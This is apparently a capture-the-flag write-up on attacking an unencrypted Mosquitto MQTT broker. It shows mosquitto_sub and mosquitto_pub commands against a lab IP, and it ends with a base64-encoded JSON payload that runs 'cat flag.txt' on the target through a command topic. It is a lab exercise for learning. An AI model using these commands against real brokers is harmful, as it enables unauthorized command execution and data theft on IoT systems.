## 1883 - Pentesting MQTT 

Mosquitto is a message broker that uses MQTT protocol to transfer messages between your toasters. JK, well not really, it transfers messages between its server and its IoT devices. We can connect to this using mosquitto and subscribe to recieve messages with mosquitto sub.

using [mosquitto sub](https://mosquitto.org/man/mosquitto_sub-1.html) we can subscribe to any of the topics `-t` we found with the service scan and print the messages it recieves. We can also filter out messages with `-T`.

It's recommended that you use TLS encrypted connections or else any messages you send/recieve are in plain text.

Capturing out request in wireshark we can see this isnt using an encrypted TLS connection.

We can capture ll comments with `-t '#'`

```shell
mosquitto_sub -h 10.10.108.171 -p 1883 -t '#'
```

```shell

```

This base64 decoded: We can use the pub topic to open up a listener with mosquito sub:

1. `mosquitto_sub -h 10.10.108.171 -p 1883 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub`
2. Send through a test with another terminal `mosquitto_pub -h 10.10.108.171 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m test` and should recieve a response.
3. We get another base64 to decode that give suw what we need to continue. We can then encode another payload with base64: `echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64`
4. and send this through to get our encoded flag: `mosquitto_pub -h 10.10.108.171 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K`
